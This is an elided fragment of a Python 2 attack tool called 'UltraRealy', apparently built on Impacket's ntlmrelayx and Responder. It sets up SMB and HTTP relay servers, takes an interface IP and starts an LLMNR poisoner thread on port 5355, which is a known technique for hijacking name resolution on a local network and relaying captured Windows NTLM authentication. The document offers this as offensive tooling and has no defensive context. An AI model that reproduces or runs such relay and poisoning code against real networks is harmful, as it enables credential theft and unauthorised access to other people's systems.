...
from ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
...
if __name__ == '__main__':
    ...
    print "UltraRealy v0.1 - md5_salt & tomato"
    print "Based on Impacket and Responder\n"
    #Parse arguments
    ...
    parser.add_argument('-ip','--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
                  'bind SMB and HTTP servers',default='', required=True)
    ...
    # Launch LLMNR Poisoner
    from llmnrpoison import settings, serve_LLMNR_poisoner, LLMNR
    settings.Config.set(options.interface_ip)
    llmnrpoison_thread = Thread(target=serve_LLMNR_poisoner, args=('', 5355, LLMNR,))
    llmnrpoison_thread.daemon = True
    llmnrpoison_thread.start()
    threads.add(llmnrpoison_thread)
